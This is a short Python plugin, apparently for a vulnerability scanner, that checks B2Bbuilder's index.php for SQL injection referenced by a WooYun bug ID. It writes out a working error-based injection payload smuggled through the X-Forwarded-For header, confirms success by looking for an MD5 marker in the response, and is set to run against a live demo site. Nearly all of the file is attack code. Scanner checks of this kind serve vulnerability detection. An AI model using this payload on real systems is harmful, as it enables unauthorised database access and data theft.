#!/usr/bin/env python
#author:lufei
#Service:B2Bbuilder
#refer:http://www.wooyun.org/bugs/wooyun-2010-069790
#Type:注入
#name:wooyun-2010-069790

def assign(service, arg):
    if service == "B2Bbuilder":
        return True, arg

def audit(arg):
    url = arg + "index.php"
    headers = "X-Forwarded-For: 1.1.1.1',(select 1 from (select count(*),concat((Select concat(md5(3.14))),floor(rand(0)*2))x from information_schema.tables group by x)a),1,1)#"
    code, head, res, errcode, _ = curl.curl('-H "%s" %s' % (headers, url))
    if code == 200 and '4beed3b9c4a886067de0e3a094246f781' in res:
        security_hole(url + "\r\npayload:headers" + headers)

if __name__ == '__main__':
    from dummy import *
    audit(assign('B2Bbuilder', 'http://democn.b2b-builder.com/')[1])